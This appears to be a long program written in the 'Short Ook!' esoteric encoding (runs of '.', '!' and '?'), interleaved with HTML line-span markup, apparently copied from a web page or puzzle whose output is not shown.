!!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ...!. ....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. .!.?.</span><br><span class="line">..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!!</span><br><span class="line">!!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... .!... !.?.. .....</span><br><span class="line">..... .!?!! .?... ..... ....? .?!.? ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ....! .!!!! !!!.? ..... ..... ...!? !!.?. .....</span><br><span class="line">..... .?.?! .?... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ..... !.!!! !!!!! !!!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?... ..... ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? .....</span><br><span class="line">..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. .....</span><br><span class="line">!.!!! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... .!.?.</span><br><span class="line">..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!!</span><br><span class="line">!!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ....! ...!. ?.... .....</span><br><span class="line">....! ?!!.? ..... ..... ..?.? !.?.. ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?... ..... ..... .!.!! !!!!! !!!!. ?.... ..... ..!?! !.?.. ..... ...?.</span><br><span class="line">?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!!</span><br><span class="line">!!!.! ..... ..... ...!. !!!!! !!!!. ?.... ..... ....! ?!!.? ..... .....</span><br><span class="line">..?.? !.?.. ..... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">....! .!!!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. ..... .....</span><br><span class="line">!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!!</span><br><span class="line">.?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ..... !.!!! !!!!.</span><br><span class="line">?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. ..... ...!. ?.... .....</span><br><span class="line">..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!!</span><br><span class="line">!!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!. ?.... .....</span><br><span class="line">....! ?!!.? ..... ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.?</span><br><span class="line">!!!!! !!!!! !.!.. ..... ..... .!.!! !!!.? ..... ..... ...!? !!.?. .....</span><br><span class="line">..... .?.?! .?... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ..... !.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... .....</span><br><span class="line">..... ..... ..!.! !!!!! !!!!! !!!!! !!!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?... ..... ..... ..... !.!!! !!!!! !!!!! !!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.?</span><br><span class="line">!!!!! !!!!! !.!.. ..... !.!!! .?... ..... ..... !?!!. ?.... ..... ...?.</span><br><span class="line">?!.?. ..... ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? .....</span><br><span class="line">..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. .....</span><br><span class="line">....! ..... ....! .?... ..... ...!? !!.?. ..... ....? .?!.? ..... .....</span><br><span class="line">..... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ...!.</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. .!.?. ..... .....</span><br><span class="line">!?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!</span><br><span class="line">!!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... ...!. !!!!! !!!!. ?.... .....</span><br><span class="line">....! ?!!.? ..... ..... ..?.? !.?.. ..... ...!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!. ?.... ..... ....! ?!!.?</span><br><span class="line">..... ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ..... .!.!! !!!!! !!.?. ..... ..... ..!?! !.?.. ..... .....</span><br><span class="line">?.?!. ?.... ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?...</span><br><span class="line">..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! .....</span><br><span class="line">..... .!... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?..! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ....! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. ..... ..... ..... ..!.! !!!!! !!!!! !!!!.</span><br><span class="line">?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.?</span><br><span class="line">!!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!!</span><br><span class="line">!.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ..... !.!!! !!!!! !!!.? .....</span><br><span class="line">..... ...!? !!.?. ..... ..... .?.?! .?... ..... ..... .!.?. ..... .....</span><br><span class="line">!?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!</span><br><span class="line">!!!!? .?!.? !!!!! !!!!! !.!.. ..... ....! ..... !.?.. ..... ..... .!?!!</span><br><span class="line">.?... ..... ....? .?!.? ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!.</span><br><span class="line">?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!.</span><br><span class="line">..... ..... ....! .!.?. ..... ..... ..!?! !.?.. ..... ..... ?.?!. ?..!.</span><br><span class="line">?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.?</span><br><span class="line">!!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!.</span><br><span class="line">?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. ..... .!.?. ..... .....</span><br><span class="line">!?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!</span><br><span class="line">!!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... .!.!! !!!!! !!.?. ..... .....</span><br><span class="line">..!?! !.?.. ..... ..... ?.?!. ?.... ..... ...!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... .!... ....! .?... ..... ..... !?!!. ?....</span><br><span class="line">..... ...?. ?!.?! .?... ..... ...!? !!.?. ..... ....? .?!.? !.?.. .....</span><br><span class="line">..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... .....</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... .....</span><br><span class="line">..!.! !!!!! !!!!! !!!!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?...</span><br><span class="line">..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! .....</span><br><span class="line">..... ..... !.!!! !!!!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?..</span><br><span class="line">..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... .....</span><br><span class="line">..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ....! .?...</span><br><span class="line">..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... ..... !.!!! !!!!!</span><br><span class="line">!!!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... !.... .!.?.</span><br><span class="line">..... ..... ..!?! !.?.. ..... ..... ?.?!. ?..!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... .!... ..... .!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?... ..... ..... ..... ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ....! .!!!! !!!.? ..... ..... ...!? !!.?. .....</span><br><span class="line">..... .?.?! .?... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ...!. ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?. .....</span><br><span class="line">..... ..... ....! .?... ..... ...!? !!.?. ..... ....? .?!.? !.?.. .....</span><br><span class="line">..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... .....</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... .....</span><br><span class="line">..... .!.!! !!!!! !!!!! !!!!! !!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ....! ...!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?..</span><br><span class="line">..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... ....! .!.?.</span><br><span class="line">..... ..... ..!?! !.?.. ..... ..... ?.?!. ?..!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... .!... ..... .!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?... ..... ..... ..... ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... !.... .!.?. ..... ..... ..!?! !.?.. ..... .....</span><br><span class="line">?.?!. ?..!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... .....</span><br><span class="line">....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ...!.</span><br><span class="line">..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?..! .?... ..... ...!?</span><br><span class="line">!!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!!</span><br><span class="line">!!?.? !.?!! !!!!! !!!!. !.... ..... ..... .!.!! !!!!! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. ..... ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ..!.! !!.?. ..... ..... ..!?! !.?.. ..... .....</span><br><span class="line">?.?!. ?.... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... .....</span><br><span class="line">..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... .....</span><br><span class="line">..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... ..... ..... .....</span><br><span class="line">..!.! !!!!! !!!!! !!!!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ...!. ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... .!.?.</span><br><span class="line">..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!!</span><br><span class="line">!!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... ...!. !.?.. .....</span><br><span class="line">..... .!?!! .?... ..... ....? .?!.? ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ..!.! !!!!! !!!!! .?... ..... ..... !?!!. ?....</span><br><span class="line">..... ...?. ?!.?. ..... ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?.</span><br><span class="line">?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!!</span><br><span class="line">!!!.! ..... ..... .!... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?..! .?... ..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... .....</span><br><span class="line">!?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ....! ...!.</span><br><span class="line">?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. !.?.. ..... ....! ?!!.?</span><br><span class="line">..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?.</span><br><span class="line">?!.?! !!!!! !!!!! .!... ..... ..... ..!.! !!!!! !.?.. ..... ..... .!?!!</span><br><span class="line">.?... ..... ....? .?!.? ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?.</span><br><span class="line">?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!!</span><br><span class="line">!!!.! ..... ..... ...!. !!!!! !!!!! !.?.. ..... ..... .!?!! .?... .....</span><br><span class="line">....? .?!.? ..... ..... ....! .?... ..... ...!? !!.?. ..... ....? .?!.?</span><br><span class="line">!.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!.</span><br><span class="line">!.... ..... !.... ...!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?..</span><br><span class="line">!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!!</span><br><span class="line">.?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .!... ..!.? .....</span><br><span class="line">..... ...!? !!.?. ..... ..... .?.?! .?... .!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.?</span><br><span class="line">!!!!! !!!!! !.!.. ..... ..... .!... ....! .?... ..... ...!? !!.?. .....</span><br><span class="line">....? .?!.? ..... ..... ..... ..... !.?.. ..... ....! ?!!.? ..... .....</span><br><span class="line">?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!!</span><br><span class="line">!!!!! .!... ..... ..... !.!!! .?... ..... ..... !?!!. ?.... ..... ...?.</span><br><span class="line">?!.?. ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ...!.</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. .!.?. ..... .....</span><br><span class="line">!?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!</span><br><span class="line">!!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... ...!. !!!!! !!!!. ?.... .....</span><br><span class="line">....! ?!!.? ..... ..... ..?.? !.?.. ..... ...!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!. ?.... ..... ....! ?!!.?</span><br><span class="line">..... ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ..... .!.!! !!!!! !!.?. ..... ..... ..!?! !.?.. ..... .....</span><br><span class="line">?.?!. ?.... ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?...</span><br><span class="line">..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! .....</span><br><span class="line">....! ..... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?..! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ..!.. .!.?. ..... .....</span><br><span class="line">..!?! !.?.. ..... ..... ?.?!. ?.... !.?.. ..... ....! ?!!.? ..... .....</span><br><span class="line">?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!!</span><br><span class="line">!!!!! .!... ..... ..... ..!.! !!!!! !!!.? ..... ..... ...!? !!.?. .....</span><br><span class="line">..... .?.?! .?... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!.</span><br><span class="line">?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!.</span><br><span class="line">..... ..... ..!.! !!!!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?..</span><br><span class="line">..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... .....</span><br><span class="line">..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ....! .....</span><br><span class="line">!.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..!.? ..... ..... .!?!!</span><br><span class="line">.?... ..... ..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!!</span><br><span class="line">?.?!. ?!!!! !!!!! !!.!. ..... ..... !.!!! !!!!! !.?.. ..... ..... .!?!!</span><br><span class="line">.?... ..... ....? .?!.? ..... ..... ....! .?... ..... ...!? !!.?. .....</span><br><span class="line">....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!!</span><br><span class="line">!!!!! !!!!. !.... ..... ..... .!.!! !!!!! .?... ..... ..... !?!!. ?....</span><br><span class="line">..... ...?. ?!.?. ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!.</span><br><span class="line">?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!.</span><br><span class="line">..... ..... !.... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?....</span><br><span class="line">..... ..... ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? .....</span><br><span class="line">..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. .....</span><br><span class="line">!.!!! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... .!.?.</span><br><span class="line">..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!!</span><br><span class="line">!!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... !.... ..... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? ..... ..... ..... ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ..... ..!.! !!!!! !!!.? .....</span><br><span class="line">..... ...!? !!.?. ..... ..... .?.?! .?... ..... ..!.? ..... ..... .!?!!</span><br><span class="line">.?... ..... ..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!!</span><br><span class="line">?.?!. ?!!!! !!!!! !!.!. ..... ..... ..!.! !!!!. ?.... ..... ....! ?!!.?</span><br><span class="line">..... ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ....! ..... !.?.. ..... ..... .!?!! .?... ..... ....? .?!.?</span><br><span class="line">..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... ....! .!!!!</span><br><span class="line">!!!!! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ..... .!.!! !!!!! .?...</span><br><span class="line">..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..!.? ..... ..... .!?!!</span><br><span class="line">.?... ..... ..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!!</span><br><span class="line">?.?!. ?!!!! !!!!! !!.!. ..... ..... ..!.! !!!!! !!!.? ..... ..... ...!?</span><br><span class="line">!!.?. ..... ..... .?.?! .?... ..... ....! .?... ..... ...!? !!.?. .....</span><br><span class="line">....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!!</span><br><span class="line">!!!!! !!!!. !.... ..... !.... ..... !.?.. ..... ..... .!?!! .?... .....</span><br><span class="line">....? .?!.? !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .....</span><br><span class="line">!.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... ..... ..... ...!.</span><br><span class="line">!!!!! !!!!! !!!!! .?... ..... ...!? !!.?. ..... ....? .?!.? !.?.. .....</span><br><span class="line">..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ...!.</span><br><span class="line">!!!!! !!.?. ..... ..... ..!?! !.?.. ..... ..... ?.?!. ?.... ..... .....</span><br><span class="line">..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... ..!.! !!!!!</span><br><span class="line">!!!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... ..... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ...!. !!!.? ..... ..... ...!?</span><br><span class="line">!!.?. ..... ..... .?.?! .?... ..... ....! .?... ..... ...!? !!.?. .....</span><br><span class="line">....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!!</span><br><span class="line">!!!!! !!!!. !.... ..... ..... .!.!. ?.... ..... ....! ?!!.? ..... .....</span><br><span class="line">..?.? !.?.. !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .....</span><br><span class="line">..!.! !!!!! !.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... ...!.</span><br><span class="line">?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.?</span><br><span class="line">!!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ...!. !!!!! !!!!!</span><br><span class="line">!.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... ..... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ...!. !.?.. ..... ..... .!?!!</span><br><span class="line">.?... ..... ....? .?!.? ..... ..... !.?.. ..... ....! ?!!.? ..... .....</span><br><span class="line">?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!!</span><br><span class="line">!!!!! .!... ..... ...!. ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... .....</span><br><span class="line">..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... ...!.</span><br><span class="line">!!!!! !!.?. ..... ..... ..!?! !.?.. ..... ..... ?.?!. ?.... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ....! .!!!! !!!!! !!.?.</span><br><span class="line">..... ..... ..!?! !.?.. ..... ..... ?.?!. ?.... ..... ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ...!. ....! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ..... .!... !.?.. ..... ..... .!?!! .?... ..... ....? .?!.?</span><br><span class="line">..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... ....! .!!!!</span><br><span class="line">!!!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ..... !.!!! !!!!! !.?.. .....</span><br><span class="line">..... .!?!! .?... ..... ....? .?!.? ..... ..... ..!.? ..... ..... .!?!!</span><br><span class="line">.?... ..... ..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!!</span><br><span class="line">?.?!. ?!!!! !!!!! !!.!. ..... ..... !.... .!.?. ..... ..... ..!?! !.?..</span><br><span class="line">..... ..... ?.?!. ?..!. ?.... ..... 